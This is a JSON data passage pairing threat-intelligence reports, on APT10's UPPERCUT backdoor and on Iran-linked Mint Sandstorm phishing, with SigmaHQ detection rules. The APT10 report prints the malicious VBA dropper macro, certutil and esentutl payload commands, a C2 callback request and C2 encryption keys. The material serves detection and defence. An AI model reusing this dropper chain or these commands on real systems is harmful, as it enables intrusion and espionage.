          "CommandLine|contains": "\\desktop.ini "
        },
        "filter_optional_intel": {
          "ParentImage|endswith": "\\cmd.exe",
          "CommandLine": "+R +H +S +A \\\\\\*.cui",
          "ParentCommandLine": "C:\\\\WINDOWS\\\\system32\\\\\\*.bat"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "IgfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)",
        "Msiexec.exe hiding desktop.ini"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_hiding_files.yml"
  },
  "11": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/apt10-targeting-japanese-corporations-using-updated-ttps/",
    "markdown": "# APT10 Targeting Japanese Corporations Using Updated TTPs\n\n**September 13, 2018**\n\n---\n\n## Introduction\n\nIn July 2018, FireEye devices detected and blocked what appears to be APT10 (Menupass) activity targeting the Japanese media sector. APT10 is a Chinese cyber espionage group that FireEye has tracked since 2009, and they have a history of targeting Japanese entities.\n\nIn this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor. This backdoor is well-known in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently. Part of this blog post will discuss the updates and differences we have observed across multiple versions of this backdoor.\n\n## Attack Overview\n\nThe attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails. Although the contents of the malicious documents are unreadable, the Japanese titles are related to maritime, diplomatic, and North Korean issues. Table 1 shows the UPPERCUT indicators of compromise (IoCs).\n\n| **File Name**                                                                                                                              | **MD5**                          | **Size** | **C2**                                               |\n| ------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------- | -------- | ---------------------------------------------------- |\n| 自民党海洋総合戦略小委員会が政府に提言申し入れ.doc (Government Recommendations from the Liberal Democratic Party’s Comprehensive Strategic Maritime Subcommittee) | 4f83c01e8f7507d23c67ab085bf79e97 | 843022   | eservake.jetos[.]com, 82.221.100.52, 151.106.53.147  |\n| グテマラ大使講演会案内状.doc (Invitation to Lecture by Guatemalan Ambassador)                                                                          | f188936d2c8423cf064d6b8160769f21 | 720384   | eservake.jetos[.]com, 151.106.53.147, 153.92.210.208 |\n| 米国接近に揺れる北朝鮮内部.doc (North Korean interior swayed by the approach of the United States)                                                      | cca227f70a64e1e7fcf5bccdc6cc25dd | 733184   | eservake.jetos[.]com, 153.92.210.208, 167.99.121.203 |\n\n*Table 1: UPPERCUT IoCs*\n\nFor the North Korean lure, a news article with an identical title was readily available online. It’s also worth noting that in the Guatemalan lure, the attacker used an unusual spelling of Guatemala in Japanese. The top result of a Google search using the same spelling led us to the event website for the lecture of the Guatemalan Ambassador, held in August 2018.\n\n```image\nAlt: Event Website for the Lecture of Guatemala Ambassador\nDescription: The image displays a webpage detailing a seminar event hosted by the Latin American Association in Tokyo, Japan. It includes information such as the date and time of the event (August 9, 2018, from 15:00 to 16:30), the venue (a specific clinic in Tokyo), and contact details including a phone number, fax number, and email address. The content appears to be an invitation that highlights the discussion topics related to Guatemala and Japan's diplomatic relations.\nTranscription: |\n  webmaster\n  平成は当協会の活動に関し格別のご支援、ご協力を賜り感謝申し上げます。\n  今回取り上げますグアテマラは、小国の多い中米諸国の中では人・経済規模で最大の国です。米国に続き今年5月に在イスラエル大使館をエルサレムに移転し、6月初めにはフェニックス山の噴火、直近では米トランプ政権のゼロ・トランスジェンダー政策による移民親子の引き離しなど、世界の目を集めています。\n  日本との関係では、国連安保理改革や国際連携を強めていく国であり、基本的価値を共有する有力なパートナー国の一つです。\n  一般、時期的に見られる各国関係駐グアテマラ大使をお招きし、比較的安定したペースで経済成長が続くよう、格差是正、環境保護、治安改善、インフラ整備といった課題を抱えるグアテマラの現状と展望をお話ししたいと思いますので、奮ってご参加ください。\n  \n  【日程】2018年8月9日（木）15：00～16：30\n  【会場】日比谷国際ビルB1 会議室（日比谷国際クリニック検診センター右隣）\n  東京都千代田区内幸町2-2-3　Tel：03-3591-3831\n  【主催】一般社団法人ラテンアメリカ協会\n  【講演】「グアテマラの現状・課題と展望」\n  【講師】古谷朋彦 駐グアテマラ特命全権大使\n  【参加費】会員2,000円、非会員3,000円／大学院生・大学生　無料\n  【備考】\n  ●申込受付：先着順 50名まで。お早めに以下からお申し込みください。\n  ●申込締切：平2018年8月6日（月）\n  以下WEBサイトからお申し込みください。\n  URL: https://latin-america.jp/seminar-entry\n  【詳細プラン】（PDF）こちらをクリック\n  \n  【ラテンアメリカ協会】\n  〒100-0011東京都千代田区内幸町2-2-3日比谷国際ビル120A\n  Tel: 03-3591-3831 Fax: 03-6205-4262 E-mail: info@latin-america.jp\n```\n\n*Figure 1: Event Website for the Lecture of Guatemala Ambassador*\n\nFigure 2 shows the macro function that displays the lure document. At the bottom of this function, we can see the readable text that matches the contact information found in Figure 1. Thus, people who would have an interest in Latin American issues may have been the targets of this campaign.\n\n```image\nAlt: Macro to display lure document\nDescription: The image displays a piece of VBA code from a Microsoft Word document. The code appears to define a subroutine named `ShowMsg()`, which constructs a message string containing contact information, including a phone number and an email address related to Latin American issues. The relevant information is highlighted in red, indicating it may be part of a lure used in a cyber attack to entice targets interested in Latin American topics.\nTranscription: |\n  vb\n  Sub ShowMsg()\n  Dim msg As String\n  msg = _\n      \"CãŽJ·ü·F '´fOfe]f}f¬ü-{åŽgu%š†\" _\n      & \"u'·ÄfO[fAfe]f}f¬I«©ÔãÛ`è,ÆW-]v\" _\n      & \"y\"üžzz 2018\"N ŒŽ9\"ü-Øj1F00\"16:30@\" _\n      & \"yžëž\"u\"J'ÚfNfŠfjfbfNC¥fƒzƒ^[%E-xj\" _\n      & \"@@@@ \"Cž`g\"ëž\"J'ÚfNfŠfjfbfNC¥fƒzƒ^\" _\n      & \"yžÄž\"é\"éŽfŽC-ç[ƒf]f}fAf5f}j\" _\n      & \"yüŽz CãJ·ü·F '´fOfe]f}f¬äžg\" _\n      & \"Tel.: 03-3591-3831\" _\n      & \"Fax: 03-6205-4262\" _\n      & \"E-mail: info@latin-america.jp\" _\n      & \"A\\ž;=,Ø,®ë,ë\" _\n      & \"ËtëWEBfJfCf,g(,®B,ë,ë\" _\n      & \"URL: https://latin-america.jp/seminar-entry\" _\n      & \"S100-0011\" _\n      & \"y\"fef\"f}fŠf}f\" _\n      & \"ActiveDocument.Content.Text = msg\n  ActiveDocument.Save\n  End Sub\n```\n\n*Figure 2: Macro to display lure document*\n\nThe initial Word documents were password protected, likely in an effort to bypass detection. Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro.\n\n```image\nAlt: Lure document\nDescription: The image displays a screenshot of a Microsoft Word document that appears to be a lure for a phishing attack. The document prompts users to enable editing and content, indicating that it contains potentially malicious VBA macros. The left side of the image shows a standard warning message from Microsoft Office about viewing the document in online mode, while the right side contains unreadable, corrupted text that likely represents the malicious payload intended to deceive the user into enabling macros.\n```\n\n*Figure 3: Lure document*\n\nFigure 4 shows what happens when the malicious macro is executed.\n\n```image\nAlt: Macro to install UPPERCUT\nDescription: The image displays a segment of VBA code used in a macro. It outlines commands for executing system-level tasks such as copying files, decoding them using 'certutil.exe', and running executables. The code indicates the steps taken by the macro to manipulate files in the user's profile and execute a payload, revealing the automated processes involved in the malicious attack.\nTranscription: |\n  vb\n  Sub ObjRun(CommandMoveTo As String, CopyTo01 As String, CopyTo02 As String, CopyTo03 As String, AllUsersProfile)\n      Dim certutilCommand As String\n      cermoveCommand = \"cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp\"\n      certutilCommand = \"cmd.exe /c %temp%tcm.tmp -decode \"\n      Set objws = CreateObject(\"Wscript.Shell\")\n      objws.Run CommandMoveTo, 0, True\n      objws.Run cermoveCommand, 0, True\n      objws.Run certutilCommand & AllUsersProfile & \"\\pense1.txt \" & CopyTo01, 0, True\n      objws.Run certutilCommand & AllUsersProfile & \"\\pense2.txt \" & CopyTo02, 0, True\n      objws.Run certutilCommand & AllUsersProfile & \"\\pense3.txt \" & CopyTo03, 0, True\n      objws.Run \"esentutil.exe /y \" & AllUsersProfile & \"\\GUP.exe\" & \" /o\", 0, True\n      objws.Run \"esentutil.exe /y \" & CopyTo02 & \" /d \" & AllUsersProfile & \"\\libcurl.dll\" & \" /o\", 0, True\n      objws.Run \"cmd.exe /c del /s /q \" & AllUsersProfile & \"\\*.txt\", 0, False\n  End Sub\n```\n\n*Figure 4: Macro to install UPPERCUT*\n\nThe execution workflow is as follows:\n\n1. The macro drops three PEM files, `padre1.txt`, `padre2.txt`, and `padre3.txt`, to the victim’s `%TEMP%` folder and then copies them from `%TEMP%` to the `%AllUserProfile%` folder.\n2. The macro decodes the dropped files using Windows `certutil.exe` with the following commands:\n\n   ```\n   C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre1.txt C:\\ProgramData\\\\GUP.txt\n   C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre2.txt C:\\ProgramData\\libcurl.txt\n   C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre3.txt C:\\ProgramData\\\\3F2E3AB9\n   ```\n\n3. The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (`esentutil.exe`) with the following commands:\n\n   ```\n   C:\\Windows\\System32\\esentutl.exe\" /y C:\\ProgramData\\\\GUP.txt /d C:\\ProgramData\\GUP.exe /o\n   C:\\Windows\\System32\\esentutl.exe\" /y C:\\ProgramData\\\\libcurl.txt /d C:\\ProgramData\\libcurl.dll /o\n   ```\n\nThe dropped files include the following:\n\n- `GUP.exe`: GUP, a free (LGPL) Generic Updater. GUP is an open source binary used by Notepad++ for software updates. The version used here is version 4.1 digitally signed by Notepad++.\n- `libcurl.dll`: Malicious Loader DLL\n- `3F2E3AB9`: Encrypted shellcode\n\n```image\nAlt: Notepad++ signed updater\nDescription: The image displays the properties window of a file named 'GUP.exe,' showing the digital signature details. It indicates that the signer is 'Notepad++,' with a message stating 'This digital signature is OK.' The signing time is recorded as 'Thursday, September 22, 2016 2:16:17 AM.' The window also includes sections for counter-signatures, indicating timestamps related to the digital signature.\nTranscription: |\n  GUP.exe Properties\n  \n  Digital Signature Details\n  \n  General | Advanced\n  \n  Signature list:\n  Name of signer: Notepad++\n  \n  Digital Signature Information\n  This digital signature is OK.\n  \n  Signer information:\n  Name: Notepad++\n  E-mail: Not available\n  Signing time: Thursday, September 22, 2016 2:16:17 AM\n  [View Certificate]\n  \n  Countersignatures:\n  Name of signer: E-mail address: Timestamp\n  DigiCert Timestamp: Not available Thursday, September...\n```\n\n*Figure 5: Notepad++ signed updater*\n\n4. The macro launches the legitimate executable `GUP.exe`.\n\n   - The executable sideloads the malicious DLL (`libcurl.dll`), which decrypts and runs shellcode (`3F2E3AB9`) located in the same folder.\n   - The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT. Before decoding the DLL, the shellcode uses an anti-debug technique based on `ntdll_NtSetInformationThread` which causes the thread to be detached from the debugger.\n\n```image\nAlt: Anti-debug technique used by shellcode\nDescription: The image displays a segment of assembly code related to the anti-debug technique used by malware. It shows a sequence of instructions, including pushes and calls to the `ntdll_NtSetInformationThread` function. This function is typically used to manipulate thread information, likely employed here to evade debugging during the execution of the malicious payload.\nTranscription: |\n  004AF673  push   ebx\n  004AF674  push   ebx\n  004AF675  push   11h\n  004AF677  mov    [esi+94h], eax\n  004AF67D  call   dword ptr [esi+90h] ; ntdll_NtSetInformationThread\n  004AF683  push   eax\n  004AF684  call   dword ptr [esi+94h] ; ntdll_NtSetInformationThread\n```\n\n*Figure 6: Anti-debug technique used by shellcode*\n\n5. The macro deletes the initially dropped `.txt` files using Windows `esentutl.exe` and changes the document text to an embedded message.\n\n```image\nAlt: Attack overview\nDescription: The image depicts a flowchart illustrating the execution workflow of a cyber attack involving a malicious VBA macro embedded in a Microsoft Word document. It details the steps taken after the macro is executed, including dropping three PEM files, decoding them, renaming, and executing a legitimate updater that loads a malicious DLL. The workflow is structured with arrows connecting each step, highlighting processes such as dropping files, executing commands, and loading data.\nTranscription: |\n  1. Drop 3 files\n  2. Decode\n  3. Rename\n  4. Execute\n     4.1 Load\n     4.2 Read\n  5. Delete\n```\n\n*Figure 7: Attack overview*\n\nSeveral threat actors leverage the technique of using Windows certutil.exe for payload decoding, and APT10 continues to employ this technique.\n\n## Evolution of UPPERCUT\n\n```image\nAlt: Timeline of UPPERCUT updates\nDescription: The image is a timeline chart displaying the evolution of the UPPERCUT malware updates over specific dates. It features two separate lines representing 'Doc Created Time' and 'PE Compile Time,' with points indicating various versions of the malware (5.0.0 beta1, 5.1.1 rc, 5.1.2 rc1, 5.3.2, and 5.4.1). Each point is marked with a dot and corresponds to a date on the horizontal axis, showing the progression of changes in the UPPERCUT malware across time.\nTranscription: |\n  | **Doc Created Time** | **PE Compile Time** |\n  | -------------------- | ------------------- |\n  | 2017-04-25           |                     |\n  | 2017-06-14           |                     |\n  | 2017-08-03           | 5.0.0 beta1         |\n  | 2017-09-22           | 5.1.1 rc            |\n  | 2017-11-11           |                     |\n  | 2018-02-19           |                     |\n  | 2018-04-10           |                     |\n  | 2018-05-30           | 5.1.2 rc1           |\n  | 2018-07-19           | 5.3.2               |\n  |                      | 5.4.1               |\n  | 2018-09-07           |                     |\n```\n\n*Figure 8: Timeline of UPPERCUT updates*\n\nUnlike previous versions, the exported function names are randomized in the latest version (Table 2).\n\n| **Encoded Payload**              | **Decoded Payload** |                                  |                       |             |\n|----------------------------------|---------------------|----------------------------------|-----------------------|-------------|\n| **MD5**                          | **Size**            | **Import Hash**                  | **Exported Function** | **Version** |\n|----------------------------------|---------------------|----------------------------------|-----------------------|-------------|\n| aa3f303c3319b14b4829fe2faa5999c1 | 322164              | 182ee99b4f0803628c30411b1faa9992 | l7MF25T96n45qOGWX     | 5.3.2       |\n| 126067d634d94c45084cbe1d9873d895 | 330804              | 5f45532f947501cf024d84c36e3a19a1 | hJvTJcdAU3mNkuvGGq7L  | 5.4.1       |\n| fce54b4886cac5c61eda1e7605483ca3 | 345812              | c1942a0ca397b627019dace26eca78d8 | WcuH                  | 5.4.1       |\n\n*Table 2: Static characteristics of UPPERCUT*\n\nAnother new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server. This was likely included to help the attackers understand the problem if the backdoor is unable to receive a response.\n\n```image\nAlt: Example of callback\nDescription: The image displays a raw HTTP POST request, including various headers and parameters sent to a server. Key elements include the URL path '/nCFdIVd', a Cookie with the value 'GetLastError=12031', and headers such as 'User-Agent', 'Content-Type', and 'Host'. The request indicates a form submission with URL-encoded data, likely related to the operation of malware from the UPPERCUT series.\nTranscription: |\n  POST /nCFdIVd?\n  Wkh=7U2vKLFUgK9Bej5hjJyw4RzlW7NRPsw992xy646CdK&Bx8=agmJrUBhcWkbQ0/B\n  +U95REo= &ARJYsT=hbIBuPcQcltVRwdv\n  +1E5Yk=&DXA=BZHycBEXKXWk8Hf19hzpU=&T=11Ldf16tn2Uxyc3nCQLAgzU=&w00=huFIdWvI\n  XVMRbNY0ENOLVkH8x6bXvF/njsChRsh6aChA1X4WTU=&zQNhSzWG=twPNN/\n  IPtU81&fyjfl=CB5f716vB2dITsp3XSC+MTU= HTTP/1.1\n  Cookie: GetLastError=12031\n  Accept: text/html, application/xhtml+xml, */*\n  Accept-Language: en-US\n  Content-Type: application/x-www-form-urlencoded\n  User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/ 7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0E)\n  Host: eservake.jetos.com\n  Content-Length: 13079\n  Connection: Keep-Alive\n  Cache-Control: no-cache\n```\n\n*Figure 9: Example of callback*\n\nEarlier versions of UPPERCUT used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. However, in the latest version, the keys are hard-coded uniquely for each C2 address and use the C2’s calculated MD5 hash to determine which key to use.\n\n```image\nAlt: Blowfish key generation\nDescription: The image depicts a code snippet related to the Blowfish key generation process used in the UPPERCUT malware. It includes a series of conditional statements that compare certain byte sequences (referred to as `SBYTE1`) against predefined MD5 hashes of command and control (C2) server addresses. The code shows how the Blowfish key is selected based on the matching MD5 hashes, utilizing a custom memory copy function (`custom_memcpy`) to assign the appropriate key. This technical detail highlights the security measures taken by the malware to dynamically generate encryption keys based on the C2 server.\nTranscription: |\n  if ( custom_memcmp(SBYTE1(u4), &str_c2_md5, \"f613846eb5bed227ec1a5f8df7e678d0\") )\n  {\n      custom_memcpy(str_blowfish_key, \"bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d\");\n  }\n  else\n  {\n      v5 = &str_c2_md5;\n      if ( custom_memcmp(SBYTE1(v5), &str_c2_md5, \"f9b6f73c2793722ff28733aaa98d2da5\") )\n      {\n          custom_memcpy(str_blowfish_key, \"fb9f7fb3c709373523ff27824ed6a31d800e275ec5217d8a11024a3dffb577dd\");\n      }\n      else\n      {\n          v6 = &str_c2_md5;\n          if ( custom_memcmp(SBYTE1(u6), &str_c2_md5, \"c500dae1c412368b59f1467ee96c1\") )\n          {\n              custom_memcpy(str_blowfish_key, \"d3450966ceb2eba93282aace7d7684380d87c6621bbd3c4f621caa079356004a\");\n          }\n          else\n          {\n              custom_memcpy(str_blowfish_key, \"f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53\");\n          }\n      }\n  }\n```\n\n*Figure 10: Blowfish key generation*\n\nFor instance, Table 3 lists the hard-coded C2 addresses, their MD5 hash, and the corresponding Blowfish key in the decoded payload of 126067d634d94c45084cbe1d9873d895.\n\n| **C2**                             | **MD5**                          | **Blowfish Key**                                                 |\n|------------------------------------|----------------------------------|------------------------------------------------------------------|\n| hxxp[:]//151.106.53[.]147/VxQG     | f613846eb5bed227ec1a5f8df7e678d0 | bdc4b9f5af9868e028dd0adc10099a4e6656e9f0ad12b2e75a30f5ca0e34489d |\n| hxxp[:]//153.92.210[.]208/wBNh1    | 50c60f37922ff2ff8733aaeaa9802da5 | fb9f7fb3c709373523ff27824ed6a31d800e275ec5217d8a11024a3dffb577dd |\n| hxxp[:]//eservake.jetos[.]com/qIDj | c500dae1ca41236830b59f1467ee96c1 | d3450966ceb2eba93282aace7d7684380d87c6621bbd3c4f621caa079356004a |\n| Default                            | Default                          | f12df6984bb65d18e2561bd017df29ee1cf946efa5e510802005aeee9035dd53 |\n\n*Table 3: Example of Blowfish keys*\n\nAnother difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication.\n\n```image\nAlt: URL parameters\nDescription: The image displays a table containing URL parameters associated with a malware's command and control (C2) communication. Each row lists a parameter name, its description, and an example of its encoded value. Parameters include PID, current timestamp, system OS version number, current user's username, time zone information, current directory, malware version number, and proxy information. The table format is structured, with clear headings for easy reference, making it useful for understanding how the malware communicates and logs system information.\nTranscription: |\n  | **URL Parameter** | **Description**                               | **Example**                                                                                           |\n  |-------------------|-----------------------------------------------|-------------------------------------------------------------------------------------------------------|\n  | Value 1           | PID MD5 hash of hostname/MachindGUID hostname | 94 21 00 00 A6 EF B7 96 C8 8F 97 F4 DE C5 09 C4 .!............                                        |\n  | Value 2           | Current timestamp                             | 31 35 33 34 37 36 33 37 36 37 1C 09 00 00 02 02 1534763767...                                         |\n  | Value 3           | System OS version number                      | 36 2E 31 2E 37 36 30 31                                                                               |\n  | Value 4           | Current logged in user's username             | 75 73 65 72                                                                                           |\n  | Value 5           | Time zone information                         | F8 FF FF FF 00 00 00 00 01 00 00 00                                                                   |\n  | Value 6           | Current directory                             | 43 3A 5C 44 6F 63 75 6D 65 6E 74 73 20 61 6C 6C 20 53 65 74 74 69 6E 67 73 5C 41 6C 6C 55 73 65 72 5C |\n  | Value 7           | Malware version number                        | 35 2E 34 2E 31                                                                                        |\n  | Value 8           | Proxy Information                             | 03 00 FF 00 00 00 00 00 00 00 00 31 32 37 2E 30 2E 30 2E 31:8080                                      |\n```\n\n*Table 4: URL parameters*\n\nAdditionally, the command string is hashed using the same RGPH hashing algorithm as before. Two more commands, `0xD290626C85FB1CE3` and `0x409C7A89CFF0A727`, are supported in the newer versions.\n\n| **Commands**       | **Description**                                                                          |\n|--------------------|------------------------------------------------------------------------------------------|\n| 0x97A168D9697D40DD | Download and validate file (XXHash comparison) from C2 server                            |\n| 0x7CF812296CCC68D5 | Upload file to C2 server                                                                 |\n| 0x652CB1CEFF1C0A00 | Load PE file                                                                             |\n| 0x27595F1F74B55278 | Download, validate (XXHash comparison), execute file, and send output to C2 server       |\n| 0xD290626C85FB1CE3 | Format the current timestamp                                                             |\n| 0x409C7A89CFF0A727 | Capture the desktop screenshot in PNG format and send it to C2                           |\n| None of the above  | The received buffer is executed via cmd.exe and the output is then sent to the C2 server |\n\n*Table 5: Supported commands*\n\n## Conclusion\n\nWhile APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving. In the newer versions of UPPERCUT, there is a significant change in the way backdoor initializes the Blowfish encryption key, which makes it harder for analysts to detect and decrypt the backdoor’s network communications. This shows that APT10 is very capable of maintaining and updating their malware.\n\nTo mitigate the threat, users are advised to disable Office macros in their settings and not to open documents from unknown sources. FireEye Multi-Vector Execution (MVX) engine is able to recognize and block this threat with the following detection names:\n\n- APT.Backdoor.Win.UPPERCUT\n- FE_APT_Backdoor_Win32_UPPERCUT\n\n---\n\nPosted in:\n\n- Threat Intelligence\n- Security & Identity",
    "sigma_rule": {
      "title": "Suspicious GUP Usage",
      "id": "0a4f6091-223b-41f6-8743-f322ec84930b",
      "status": "test",
      "description": "Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/apt10-targeting-japanese-corporations-using-updated-ttps/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2019-02-06",
      "modified": "2022-08-13",
      "tags": [
        "attack.defense-evasion",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\GUP.exe"
        },
        "filter_programfiles": {
          "Image|endswith": [
            "\\Program Files\\Notepad++\\updater\\GUP.exe",
            "\\Program Files (x86)\\Notepad++\\updater\\GUP.exe"
          ]
        },
        "filter_user": {
          "Image|contains": "\\Users\\",
          "Image|endswith": [
            "\\AppData\\Local\\Notepad++\\updater\\GUP.exe",
            "\\AppData\\Roaming\\Notepad++\\updater\\GUP.exe"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Execution of tools named GUP.exe and located in folders different than Notepad++\\updater"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gup_suspicious_execution.yml"
  },
  "12": {
    "url": "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
    "markdown": "# New TTPs observed in Mint Sandstorm campaign targeting high-profile individuals at universities and research orgs\n\n**Published on January 17, 2024**\n\n---\n\nSince November 2023, Microsoft has observed a distinct subset of Mint Sandstorm (PHOSPHORUS) targeting high-profile individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the United Kingdom, and the United States. In this campaign, Mint Sandstorm used bespoke phishing lures in an attempt to socially engineer targets into downloading malicious files. In a handful of cases, Microsoft observed new post-intrusion tradecraft including the use of a new, custom backdoor called MediaPl.\n\nOperators associated with this subgroup of Mint Sandstorm are patient and highly skilled social engineers whose tradecraft lacks many of the hallmarks that allow users to quickly identify phishing emails. In some instances of this campaign, this subgroup also used legitimate but compromised accounts to send phishing lures. Additionally, Mint Sandstorm continues to improve and modify the tooling used in targets’ environments, activity that might help the group persist in a compromised environment and better evade detection.\n\nMint Sandstorm (which overlaps with the threat actor tracked by other researchers as APT35 and Charming Kitten) is a composite name used to describe several subgroups of activity with ties to the Islamic Revolutionary Guard Corps (IRGC), an intelligence arm of Iran’s military. Microsoft attributes the activity detailed in this blog to a technically and operationally mature subgroup of Mint Sandstorm that specializes in gaining access to and stealing sensitive information from high-value targets. This group is known to conduct resource-intensive social engineering campaigns that target journalists, researchers, professors, or other individuals with insights or perspective on security and policy issues of interest to Tehran.\n\nThese individuals, who work with or who have the potential to influence the intelligence and policy communities, are attractive targets for adversaries seeking to collect intelligence for the states that sponsor their activity, such as the Islamic Republic of Iran. Based on the identities of the targets observed in this campaign and the use of lures related to the Israel-Hamas war, it’s possible this campaign is an attempt to gather perspectives on events related to the war from individuals across the ideological spectrum.\n\nIn this blog, we share our analysis of the new Mint Sandstorm tradecraft and provide detection, hunting, and protection information. Organizations can also use the mitigations included in this blog to harden their attack surfaces against the tradecraft observed in this and other Mint Sandstorm campaigns. These mitigations are high-value measures that are effective ways to defend organizations from multiple threats, including Mint Sandstorm, and are useful to any organization regardless of their threat model.\n\n## New Mint Sandstorm tradecraft\n\nMicrosoft observed new tactics, techniques, and procedures (TTPs) in this Mint Sandstorm campaign, notably the use of legitimate but compromised email accounts to send phishing lures, use of the Client for URL (curl) command to connect to Mint Sandstorm’s command-and-control (C2) server and download malicious files, and delivery of a new custom backdoor, MediaPl.\n\n### Social engineering\n\nIn this campaign, Mint Sandstorm masqueraded as high-profile individuals including as a journalist at a reputable news outlet. In some cases, the threat actor used an email address spoofed to resemble a personal email account belonging to the journalist they sought to impersonate and sent benign emails to targets requesting their input on an article about the Israel-Hamas war. In other cases, Mint Sandstorm used legitimate but compromised email accounts belonging to the individuals they sought to impersonate. Initial email messages did not contain any malicious content.\n\nThis tradecraft, namely the impersonation of a known individual, the use of highly bespoke phishing lures, and the use of wholly benign messages in the initial stages of the campaign, is likely an attempt to build rapport with targets and establish a level of trust before attempting to deliver malicious content to targets. Additionally, it’s likely that the use of legitimate but compromised email accounts, observed in a subset of this campaign, further bolstered Mint Sandstorm’s credibility, and might have played a role in the success of this campaign.\n\n### Delivery\n\nIf targets agreed to review the article or document referenced in the initial email, Mint Sandstorm followed up with an email containing a link to a malicious domain. In this campaign, follow up messages directed targets to sites such as *cloud-document-edit[.]onrender[.]com*, a domain hosting a RAR archive (*.rar*) file that purported to contain the draft document targets were asked to review. If opened, this *.rar* file decompressed into a double extension file (*.pdf.lnk*) with the same name. When launched, the *.pdf.lnk* file ran a curl command to retrieve a series of malicious files from attacker-controlled subdomains of *glitch[.]me* and *supabase[.]co*.\n\nMicrosoft observed multiple files downloaded to targets’ devices in this campaign, notably several *.vbs* scripts. In several instances, Microsoft observed a renamed version of NirCmd, a legitimate command line tool that allows a user to carry out a number of actions on a device without displaying a user interface, on a target’s device.\n\n### Persistence\n\nIn some cases, the threat actor used a malicious file, *Persistence.vbs*, to persist in targets’ environments. When run, *Persistence.vbs* added a file, typically named *a.vbs*, to the *CurrentVersion\\Run* registry key. In other cases, Mint Sandstorm created a scheduled task to reach out to an attacker-controlled *supabase[.]co* domain and download a *.txt* file.\n\n```image\nAlt: Figure 1. Intrusion chain leading to backdoors observed in the ongoing Mint Sandstorm campaign\nDescription: The image is a flowchart detailing the intrusion chain associated with the Mint Sandstorm campaign. It illustrates the steps involved in the attack, starting with 'Initial Access' through phishing emails with links to malicious domains, leading to 'Installation' via .rar files and double extension .pdf(link) files. Finally, it shows the 'Persistence' phase, where malicious .vbs files (renamed NirCmd) are executed, followed by the creation of a scheduled task or registry run key.\nTranscription: |\n  +-----------------------+\n  | Mint Sandstorm subset |\n  +-----------------------+\n             |\n             v\n  +-----------------------+\n  | Phishing email with   |\n  | links to malicious    |\n  | domains               |\n  +-----------------------+\n             |\n             v\n  +-----------------------+\n  | .rar files            |\n  +-----------------------+\n             |\n             v\n  +-----------------------+\n  | Double extension      |\n  | .pdf(link) files      |\n  +-----------------------+\n             |\n             v\n  +-----------------------+\n  | Malicious .vbs files, |\n  | renamed NirCmd        |\n  +-----------------------+\n             |\n             v\n  +-----------------------+\n  | Scheduled task or     |\n  | Registry run key      |\n  +-----------------------+\n```\n\n### Collection\n\nActivity observed in this campaign suggests that Mint Sandstorm wrote activity from targets’ devices to a series of text files, notably one named *documentLoger.txt*.\n\nIn addition to the activity detailed above, in some cases, Mint Sandstorm dropped MischiefTut or MediaPl, custom backdoors.\n\n### MediaPl backdoor\n\nMediaPl is a custom backdoor capable of sending encrypted communications to its C2 server. MediaPl is configured to masquerade as Windows Media Player, an application used to store and play audio and video files. To this end, Mint Sandstorm typically drops this file in *C:\\\\Users\\\\[REDACTED]\\\\AppData\\\\Local\\\\Microsoft\\\\Media Player\\\\MediaPl.dll*. When MediaPl.dll is run with the path of an image file provided as an argument, it launches the image in Windows Photo application and also parses the image for C2 information. Communications to and from MediaPl’s C2 server are AES CBC encrypted and Base64 encoded. As of this writing, MediaPl can terminate itself, can pause and retry communications with its C2 server, and launch command(s) it has received from the C2 using the _popen function.\n\n### MischiefTut\n\nMischiefTut is a custom backdoor implemented in PowerShell with a set of basic capabilities. MischiefTut can run reconnaissance commands, write outputs to a text file and, ostensibly, send outputs back to adversary-controlled infrastructure. MischiefTut can also be used to download additional tools on a compromised system.\n\n### Implications\n\nThe ability to obtain and maintain remote access to a target’s system can enable Mint Sandstorm to conduct a range of activities that can adversely impact the confidentiality of a system. Compromise of a targeted system can also create legal and reputational risks for organizations affected by this campaign. In light of the patience, resources, and skills observed in campaigns attributed to this subgroup of Mint Sandstorm, Microsoft continues to update and augment our detection capabilities to help customers defend against this threat.\n\n## Recommendations\n\nMicrosoft recommends the 